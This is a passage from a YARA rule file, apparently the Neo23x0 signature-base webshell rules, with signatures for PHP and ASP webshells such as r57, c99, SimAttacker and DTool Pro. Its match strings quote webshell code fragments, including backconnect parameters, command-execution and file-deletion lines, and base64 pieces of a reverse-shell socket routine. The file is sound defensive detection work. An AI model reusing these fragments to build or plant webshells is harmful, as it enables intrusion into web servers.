		$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
		$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5155-L5171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "834c33059e08e8075a8d3f69187b74f3b53afabfc37ae1f13a2f579f0948a363"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
		$s1 = ".$arrow.\"</b>\",in('text','"

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5172-L5187"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f97846fdaac949185b4ce6a25cc276f4ae4243d891acb18c3a3ce0c18b540976"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"

	strings:
		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
		$s2 = "rst.void.ru"

	condition:
		3 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7a31b923-15e5-5af4-9ad0-8d261fedf7c4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5188-L5204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "764a374c1e4acec8978db1e7e7e326c4fa95c6f92e1ca5a6d7f892bb05ecd289"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "8023394542cddf8aee5dec6072ed02b5"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo ws(2).$lb.\" <a"
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
		$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"

	condition:
		2 of them
}

rule SIGNATURE_BASE__Wacking_Php_Php_1_Specialshell_99_Php_Php_C100_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3dac5550-598a-5a0f-95c3-2e0162a686ee"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5205-L5221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0d32fc00ba2602a1140dc9030894bb9524c55b95c445a08f2bf6f8fc60108e64"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "if(eregi(\"./shbd $por\",$scan))"
		$s1 = "$_POST['backconnectip']"
		$s2 = "$_POST['backcconnmsg']"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "093892f6-ff53-5bd1-b7b2-fea21a9258aa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5222-L5239"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afbd2103b0c953d6aec070ba450f43e567560bc9743423a5731cd4d6e5e36bb6"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "8023394542cddf8aee5dec6072ed02b5"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s1 = "if(rmdir($_POST['mk_name']))"
		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "81480945-b684-50b6-9431-4ab7a786b214"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5240-L5256"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9bbcb687c83c01ad52e8978a60e604a74f10c33a63af3b91d0286b30dea42890"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Multiple_Php_Webshells_3
{
	meta:
		description = "Semi-Auto-generated  - from files multiple_php_webshells"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5258-L5279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d55c96febd64107273001edadbda6d0a1b4b00e35fb41b46561b49fca6a9bd1b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "be0f67f3e995517d18859ed57b4b4389"
		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash4 = "8023394542cddf8aee5dec6072ed02b5"
		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash6 = "817671e1bdc85e04cc3440bbd9288800"
		hash7 = "7101fe72421402029e2629f3aaed6de7"
		hash8 = "f618f41f7ebeb5e5076986a66593afd1"

	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5280-L5295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c089f8175532ddc0e2d256b4972f7db32683bd213a456622ed27ab4844d1e435"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"

	strings:
		$s0 = "<b>Dumped! Dump has been writed to "
		$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
		$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5330-L5348"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0f44dc1ff243b234a718e8dbd5cc8c4dc8eb9d3b63300a5c6ff72b86280607bf"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "c99ftpbrutecheck"
		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5349-L5365"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e9cd7425b806f71d8889f5df7f3fc2f4a692279fc4e495104646cfe28c5b5fe5"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sqlquicklaunch[] = array(\""
		$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"

	condition:
		all of them
}

rule SIGNATURE_BASE__Antichat_Php_Php_Fatalshell_Php_Php_A_Gedit_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6bf5640f-0773-5d93-8d27-0844062017c7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5366-L5382"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "789340845aeed4accaef02afa1a1fe420e73b6f5af1b621f4ec2342994045278"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
		hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
		hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"

	strings:
		$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
		$s1 = "if($action==\"phpeval\"){" fullword
		$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
		$s3 = "$dir=getcwd().\"/\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__Crystal_Php_Nshell_Php_Php_Load_Shell_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a92134cd-7f10-589f-bcda-508bc7a20efe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5397-L5412"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "71a9310b19b66e3699f75f551cc604f535ea843eb9c50f4a009edcd9c11e01b9"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "0c5d227f4aa76785e4760cdcff78a661"

	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s1 = "$dires = $dires . $directory;" fullword
		$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Cybershell_Php_Php_Img_Php_Php_Nstview_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cc4dc0e9-dbb1-560b-ae36-23d3e16a407f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5413-L5429"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afc0b1c83644aa323d308471e5978b6b03f444f5f46fbaddac28ff42d524df1e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "ef8828e0bc0641a655de3932199c0527"
		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash3 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "@$rto=$_POST['rto'];" fullword
		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Dc3_Security_Crew_Shell_Priv_Php_Specialshell_99_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d22c4cc3-842b-5a24-bf4b-a8024b447b9e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5430-L5446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7a4c74912caa1855efc3a2ea7fa6d0082f62776d77a211e59f12892d4883f240"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "433706fdc539238803fd47c4394b5109"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
		$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_1_C2007_Php_Php_C100_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5447-L5462"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a5dc73a12d8c8b89bab77b90cb3b561e9daf9db5f5ad550326a2fbce52c1c8da"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash3 = "d089e7168373a0634e1ac18c0ee00085"
		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Multiple_Php_Webshells_2_2
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5463-L5483"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "26fe586ba7f4d1931b2df81aa27543ff422e699fd56b6b1be289a0f8d6954691"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash6 = "09609851caa129e40b0d56e90dfc476c"
		hash7 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
		$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
		$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "022d2255-50cd-500b-8d91-8e34f3c46fcf"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5503-L5519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7ba3d6927dc06bfcd98ee9d7146164ca9a9024ef26eac60fabc8ed1375db618d"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Remexp_Asp_Php_2
{
	meta:
		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "274c8816-2711-5f12-937e-549ec2d57ce1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5571-L5586"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
		logic_hash = "b3cfa44898629ffa20630436ae10a94ad72f0e793d61e1157a4de649aa048fe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv_3
{
	meta:
		description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c83bb4ba-6b4e-5a88-925b-b93d08b304e4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5587-L5603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"
		logic_hash = "f93a5d87d4a490844de578067dc0b7bac6b01ceb9130cd7c70a227566e18f16c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
		$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
		$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
		$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker_2
{
	meta:
		description = "PHP Webshells Github Archive - file simattacker.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2408fad8-780f-50de-a309-99d14a1d87b6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5604-L5622"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
		logic_hash = "323b68f1d31df647775ad16a85b9f90bce4eac89188160a1e4853f8fec680160"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s20 = "$Comments=$_POST['Comments'];" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Dtool_Pro_2
{
	meta:
		description = "PHP Webshells Github Archive - file DTool Pro.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9f2922d1-b2af-58ae-b194-ecb33577effa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5623-L5641"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"
		logic_hash = "da744efb521415fb8817c0982d8d538e1e38b1c0995f43716611df37bf371c38"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
		$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
		$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
		$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
		$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
		$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
